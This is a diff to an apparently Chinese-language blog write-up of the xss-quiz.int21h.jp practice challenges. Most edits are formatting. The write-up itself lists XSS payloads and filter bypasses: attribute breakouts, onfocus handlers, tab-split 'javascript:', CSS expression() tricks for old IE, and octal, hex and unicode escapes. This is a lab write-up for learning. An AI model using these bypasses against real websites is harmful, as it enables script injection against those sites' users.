@@ -308,7 +308,7 @@
 <pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
 </code></pre><p>检查源码，发现，组成</p>
 <pre><code>&lt;INPUT size=50 value=&quot;&lt;script&gt;alert(document.domain);&lt;/script&gt;&quot; name=p1&gt;
-</code></pre><p>没有过滤，可以组合js，闭合value=“”，进行注入！</p>
+</code></pre><p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
 <pre><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;
 </code></pre><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></font>
@@ -318,7 +318,7 @@
 <pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
 </code></pre><p>源码显示：</p>
 <pre><code>&amp;#60;script&amp;#62;alert(document.domain);&amp;#60;/script&amp;#62;
-</code></pre><p>输入框发现使用特殊字符：&lt;&gt;””/ \都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
+</code></pre><p>输入框发现使用特殊字符：<code>&lt;&gt;&quot;&quot;/ \</code>都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
 <pre><code>&lt;form action=&quot;?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f&quot; method=&quot;post&quot;&gt;
 Search a place: &lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;30&quot;&gt;
 &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt; &amp;nbsp;
@@ -328,7 +328,7 @@ Choose a country: &lt;select name=&quot;p2&quot;&gt;
 &lt;option&gt;USA&lt;/option&gt;
 &lt;option&gt;United Kingdom&lt;/option&gt;
 &lt;/select&gt;&lt;hr class=&quot;red&quot;&gt;We couldn&apos;t find any places called &lt;b&gt;&quot;&amp;lt;&amp;gt;&quot;&lt;/b&gt; in &lt;b&gt;Japan&lt;/b&gt;.&lt;hr class=&quot;red&quot;&gt;&lt;/form&gt;
-</code></pre><p>可以看到特殊字符，被转译为&lt;&gt;等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
+</code></pre><p>可以看到特殊字符，被转译为<code>&amp;lt;&amp;gt;</code>等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
 <p>修改dom：</p>
 <pre><code>document.forms[0].p2.childNodes[1].innerHtml = &apos;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
 </code></pre><p>发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。</p>
@@ -350,7 +350,7 @@ Choose a country: &lt;select name=&quot;p2&quot;&gt;
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999</a></font>
 
 </blockquote>
-<p>我还是太弱鸡了，竟然看了答案，这题还是比较好分析的。<br><br>输入特殊字符发现：” 被注入，可以截断value输入，但是字符 &lt;&gt; 被转译，仍存在注入。<br><br>通过添加事件注入！<br></p>
+<p>我还是太弱鸡了，竟然看了答案，这题还是比较好分析的。<br><br>输入特殊字符发现：<code>&quot;</code>未被过滤，可以截断value输入，但是字符 <code>&lt;&gt;</code> 被转译。<br><br>仍存在注入。<br><br>通过添加事件注入！<br></p>
 <pre><code>&quot; onfocus=&quot;alert(document.domain);
 </code></pre><p>or</p>
 <pre><code>&quot; onfocus=&quot;alert(document.domain);&quot;
@@ -434,14 +434,14 @@ Conditional comments(IE)
 </code></pre><p>查看提示：</p>
 <blockquote>
 <p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;” </p>
-<p>说明过滤了on.*等一大部分， s.*和script.会变成\<xscript> </xscript></p>
+<p>说明过滤了<code>on.*</code>等一大部分， <code>s.*</code>和<code>script.</code>会变成<code>&lt;xscript&gt;</code> </p>
 <h2 id="制表符越过"><a href="#制表符越过" class="headerlink" title="制表符越过"></a>制表符越过</h2><p>输入：</p>
 </blockquote>
 <pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain);&quot;&gt;XSS&lt;/a&gt;
 </code></pre><p>源码发现：</p>
 <pre><code>&lt;A href=&quot;javaxscript:alert(document.domain);&quot;&gt;XSS&lt;/A&gt;
 </code></pre><p>加入制表符：</p>
-<pre><code>&quot;&gt;&lt;a href=&quot;javascri    p    t:alert(document.domain)&quot;;&gt;XSS&lt;/a&gt; OK
+<pre><code>&quot;&gt;&lt;a href=&quot;javascri    p    t:alert(document.domain)&quot;;&gt;XSS&lt;/a&gt; //OK
 </code></pre><p>过了！</p>
 <p>疑惑：<br>为什么</p>
 <pre><code>&quot; on&amp;#x09;focus=&quot;alert(document.dodomainmain)&quot;
@@ -453,9 +453,9 @@ Conditional comments(IE)
 </code></pre><p>显示：</p>
 <pre><code>&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus=&quot;al&amp;#9;ert(document.dodomainmain)&quot;&gt;
 </code></pre><p>这个HTML的转义应该是针对字符串的;</p>
-<p>总结：以后尽量把结果引向\<a href="">。</a></p>
+<p>总结：以后尽量把结果引<code>&lt;a href=&quot;&quot;&gt;&lt;/a&gt;</code>。</p>
 <h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><blockquote>
-<font color="red">http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988</font>
+<font color="red"><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988</a></font>
 
 </blockquote>
 <p>发现，<code>&lt;&gt;``&quot;&quot;</code>单独使用并未过滤，但是<code>&lt;script&gt;</code>、<code>alert</code>是被过滤了</p>
@@ -469,7 +469,7 @@ Conditional comments(IE)
 <p>可以截断输入，那就好办了！</p>
 <pre><code>`` onfocus=&quot;alert(document.domain);&quot;  //IE下可行
 </code></pre><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><blockquote>
-<font color="red">http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6</font>
+<font color="red"><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6</a></font>
 
 </blockquote>
 <p>如何在CSS样式中利用expression实现JavaScript中的onmouseover/onmouseout事件。<br><br>很奇怪，在ie11上，答案也不能成功，但是换了虚拟机里的IE8，成功。<br><br><strong>说明这个expression是一个浏览器兼容性的问题</strong>，解决这类兼容性xss漏洞，使用ie6即以下，效果可能更好！<br><br>附答案：</p>
@@ -486,34 +486,34 @@ body{xss:expression(alert(&apos;xss&apos;))]
 <pre><code>body{backgroud-image:url(javascript:alert(&apos;xss&apos;))}  
 body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))} 
 </code></pre><h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><blockquote>
-<font color="red">http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8</font>
+<font color="red"><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8</a></font>
 
 <p>发现expression关键字被正则了！绕过<strong>(IE8即以下！)</strong>：<br></p>
 </blockquote>
 <p>1.编码绕过</p>
 <pre><code>aa:\0065xpression(onfocus = function(){alert(document.domain)}) ERROR
-</code></pre><p>2.\ 绕过</p>
+</code></pre><p>2.<code>\</code> 绕过</p>
 <pre><code>aa:e\xpression(onfocus = function(){alert(document.domain)}) ERROR
-</code></pre><p>3.\0 绕过</p>
+</code></pre><p>3.<code>\0</code> 绕过</p>
 <pre><code>aa:e\0xpression(onfocus = function(){alert(document.domain)}) ok
-</code></pre><p>4.\**\绕过</p>
+</code></pre><p>4.<code>\**\</code>绕过</p>
 <pre><code>aa:e\**\xpression(onfocus = function(){alert(document.domain)}) ERROR
-</code></pre><p>5./**/绕过</p>
+</code></pre><p>5.<code>/**/</code>绕过</p>
 <blockquote>
 <p>好像是注解绕过</p>
 </blockquote>
 <pre><code>aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
-</code></pre><p><strong><font color="orange">\uxxxx这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 \u5c0f 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
+</code></pre><p><strong><font color="orange"><code>\uxxxx</code>这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 <code>\u5c0f</code> 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
 <h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><blockquote>
-<font color="red">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</font>
+<font color="red"><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</a></font>
 
 </blockquote>
 <p>输入：</p>
 <pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
 </code></pre><p>源码查看，不是审查元素</p>
 <pre><code>&lt;script&gt;document.write(&quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&quot;);&lt;/script&gt;
-</code></pre><p>可以看到 &lt; &gt; 这两个字符被替换为=”&lt;和&gt;，说明有过滤！</p>
-<p>由于此页使用<strong>document.write(value)</strong>，来写出内容，所以肯定存在注入！</p>
+</code></pre><p>可以看到 <code>&lt; &gt;</code>这两个字符被替换为<code>&quot;&amp;lt;</code>和<code>&amp;gt</code>;，说明有过滤！</p>
+<p>由于此页使用<code>document.write(value)</code>，来写出内容，所以肯定存在注入！</p>
 <p>控制台</p>
 <pre><code>alert(&quot;\u003c&quot;) //显示符号 &lt;
 \u0061lert(&quot;123&quot;) //123
@@ -523,20 +523,20 @@ body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))}
 <pre><code>document.write();
 </code></pre><p>执行了js，将字符串编译了！</p>
 <h2 id="JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt"><a href="#JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt" class="headerlink" title="JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;参见&gt;"></a>JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html" target="_blank" rel="external">参见</a>&gt;</h2><blockquote>
-<p><strong>所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。\x表示后面的字符是十六进制数，\表示后面的字符是八进制数。</strong><br> </p>
+<p><strong>所有的ASCII码都可以用<code>\</code>加数字（一般是8进制数字）来表示。<code>\x</code>表示后面的字符是十六进制数，<code>\</code>表示后面的字符是八进制数。</strong><br> </p>
 </blockquote>
-<p>八进制（+八进制）</p>
+<p>八进制（<code>\</code>+八进制）</p>
 <pre><code>\74script\76alert(document.domain);\74/script\76
 </code></pre><p>十六进制</p>
 <pre><code>\x3cscript\x3ealert(document.domain);\x3c/script\x3e
-</code></pre><p>发现过滤了单个 \</p>
+</code></pre><p>发现过滤了单个 <code>\</code></p>
 <p>Octonary：</p>
 <pre><code>\\74script\\76alert(document.domain);\\74/script\\76
 </code></pre><p>Hexadecimal</p>
 <pre><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
 </code></pre><p><strong>Unicode</strong>好像也可以！</p>
 <blockquote>
-<p>\u 加 4个16进制字符表示一个字符的编码</p>
+<p><code>\u</code> 加 4个16进制字符表示一个字符的编码</p>
 </blockquote>
 <pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
 </code></pre><h1 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h1><blockquote>
